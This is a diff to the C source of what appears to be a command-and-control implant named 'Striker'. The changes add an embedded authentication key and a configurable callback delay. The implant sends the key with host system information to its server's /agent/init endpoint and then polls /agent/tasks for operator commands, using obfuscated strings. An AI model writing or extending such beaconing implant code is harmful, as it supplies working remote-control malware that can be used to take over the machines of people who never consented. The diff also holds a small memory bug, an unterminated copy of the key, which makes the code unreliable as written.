@@ -24,8 +24,9 @@
 
 #define URL_SIZE (sizeof(char) * 256)
 char BASE_URL[URL_SIZE] = "[STRIKER_URL]"; // A marker for the server URL.
-char AUTH_KEY[sizeof(char) * 32] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
+char AUTH_KEY[sizeof(char) * 33] = "[STRIKER_AUTH_KEY]"; // A marker for the authentication key to use for connecting.
 char OBFS_KEY[sizeof(char) * 20] = "[STRIKER_OBFS_KEY]"; // A marker for the key to use for obfuscating strings.
+char DELAY[sizeof(char) * 20] = "[STRIKER_DELAY]"; // A marker for the callback delay.
 
 char *obfs_decode(char *str){
 
@@ -503,14 +504,18 @@ void start_session(){
   obfs_decode(BASE_URL);
   char strs[][50] = {
     "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
-    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]delay", "[OBFS_ENC]/agent/tasks/%s"};
+    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key"};
   for (int i = 0; i < 7; i++)
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
   striker->uid = malloc(AGENT_UID_SIZE);
   memset(striker->uid, 0, AGENT_UID_SIZE);
-  striker->delay = 5;
+  striker->auth_key = malloc(strlen(AUTH_KEY));
+  strncpy(striker->auth_key, AUTH_KEY, strlen(AUTH_KEY));
+  striker->delay = atoi(DELAY);
+  if (striker->delay == 0)
+    striker->delay = 10;
   striker->write_dir = malloc(PATH_MAX);
   strncpy(striker->write_dir, strs[0], PATH_MAX);
   striker->abort = 0;
@@ -525,6 +530,7 @@ void start_session(){
   post_headers = curl_slist_append(post_headers, strs[2]);
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
   cJSON *info = sysinfo();
+  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(strdup(striker->auth_key)));
   tmp = cJSON_PrintUnformatted(info);
   cJSON_Delete(info);
 
@@ -556,8 +562,6 @@ void start_session(){
   }
   tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
   strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
-  // Todo: remove this. Implant patcher should be the one defining delay, which can also be changed by operator after callback.
-  striker->delay = (unsigned short)cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(config, strs[5]));
   #ifdef STRIKER_DEBUG
     printf("[*] Agent config: %s\n", config_str);
   #endif
@@ -565,7 +569,7 @@ void start_session(){
   free(config_str);
 
   char *tasksURL = malloc(URL_SIZE);
-  snprintf(tasksURL, URL_SIZE, strs[6], striker->uid);
+  snprintf(tasksURL, URL_SIZE, strs[5], striker->uid);
   queue *tasks_queue = queue_init(MAX_TASKS_QUEUE);
   queue *completed_tasks = queue_init(MAX_TASKS_QUEUE);
   while (!striker->abort){
@@ -676,6 +680,7 @@ void start_session(){
 void cleanup_session(session *striker){
 
   free(striker->uid);
+  free(striker->auth_key);
   free(striker->write_dir);
   free(striker);
 }
